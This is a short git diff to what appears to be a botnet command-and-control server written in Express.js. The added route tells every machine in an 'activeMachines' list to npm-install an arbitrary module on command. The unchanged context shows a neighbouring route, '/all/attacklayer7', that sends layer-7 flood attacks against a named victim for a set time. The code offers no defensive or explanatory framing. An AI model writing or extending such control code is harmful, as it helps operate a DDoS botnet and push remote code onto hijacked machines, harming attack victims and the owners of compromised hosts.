@@ -255,6 +255,21 @@ app.get('/all/installscript/:scriptid', (req, res) => {
     }
     res.send(200, "OKAY")
 })
+app.get('/all/installscript/:module', (req, res) => {
+    clen = activeMachines.length
+    for (let index = 0; index < clen; index++) {
+        console.log(`Asking ${activeMachines[index]}:${CURRENTPORT}`);
+        axios.get(`http://${activeMachines[index]}:${CURRENTPORT}/npminstall/${req.params.module}`)
+            .then(res => {
+                console.log(res.data)
+            })
+            .catch(err => {
+                console.error(err);
+            })
+
+    }
+    res.send(200, "OKAY")
+})
 
 app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) => {
     clen = activeMachines.length
